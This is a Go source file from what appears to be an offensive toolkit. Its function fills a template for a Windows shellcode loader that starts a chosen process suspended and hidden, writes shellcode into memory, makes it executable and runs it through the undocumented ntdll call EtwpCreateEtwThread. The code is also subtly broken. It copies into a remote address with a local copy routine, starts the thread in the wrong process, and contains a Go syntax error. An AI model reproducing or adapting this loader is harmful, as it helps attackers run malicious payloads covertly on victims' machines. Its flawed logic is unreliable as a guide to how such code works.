package loaders

import (
	"fmt"
)

func GetEtwpCreateEtwThreadTemplate(targetProcess string) string {
	return fmt.Sprintf(`
package main

import (
    "syscall"
    "unsafe"
)


const (
    MEM_COMMIT                = 0x1000
    MEM_RESERVE               = 0x2000
    PAGE_READWRITE            = 0x4
    PAGE_EXECUTE_READ         = 0x20
    PAGE_EXECUTE_READWRITE    = 0x40
    CREATE_SUSPENDED          = 0x4
    CREATE_NO_WINDOW          = 0x8000000
)

var (
    kernel32            = syscall.MustLoadDLL("kernel32.dll")
    ntdll               = syscall.MustLoadDLL("ntdll.dll")

    RtlCopyMemory           = ntdll.MustFindProc("RtlCopyMemory")
    EtwpCreateEtwThread     = ntdll.MustFindProc("EtwpCreateEtwThread")

	VirtualAllocEx          = kernel32.MustFindProc("VirtualAllocEx")
	VirtualProtectEx        = kernel32.MustFindProc("VirtualProtectEx")
    WaitForSingleObject     = kernel32.MustFindProc("WaitForSingleObject")
)


func  loadProcess(target string) *syscall.ProcessInformation {
    var si syscall.StartupInfo
	var pi syscall.ProcessInformation

	commandLine, err := syscall.UTF16PtrFromString(target)
	if err != nil {
		panic(err)
	}

    err = syscall.CreateProcess(
		nil,
		commandLine,
		nil,
		nil,
		false,
		CREATE_SUSPENDED | CREATE_NO_WINDOW,
		nil,
		nil,
		&si,
		&pi,
    ); if err != nil {
		panic(err)
	}

	return &pi
}

func ExecuteOrderSixtySix(shellcode []byte){

    /* spawn target process */
    process := loadProcess("%s")

    /* allocating the appropriate amount of memory */
    baseAddr, _, _ := VirtualAllocEx.Call(
        uintptr(process.Process),
        0,
        uintptr(len(shellcode)),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    )

    /* copying the shellcode to memory */
    _, _, _ = RtlCopyMemory.Call(
        baseAddr,
        (uintptr)(unsafe.Pointer(&shellcode[0])),
        uintptr(len(shellcode)),
    )

    /* changing permissions for our memory segment */
    oldProtectCfg := PAGE_READWRITE
    _, _, _ = VirtualProtectEx.Call(
        uintptr(process.Process),
        baseAddr,
        uintptr(len(shellcode)),
        PAGE_EXECUTE_READ,
        uintptr(unsafe.Pointer(&oldProtectCfg)),
    )

    threadId, _, _ := EtwpCreateEtwThread.Call(baseAddr, uintptr(0))
    _, _, _, = WaitForSingleObject.Call(threadId, 0xFFFFFFFF)
}
`, targetProcess)
}
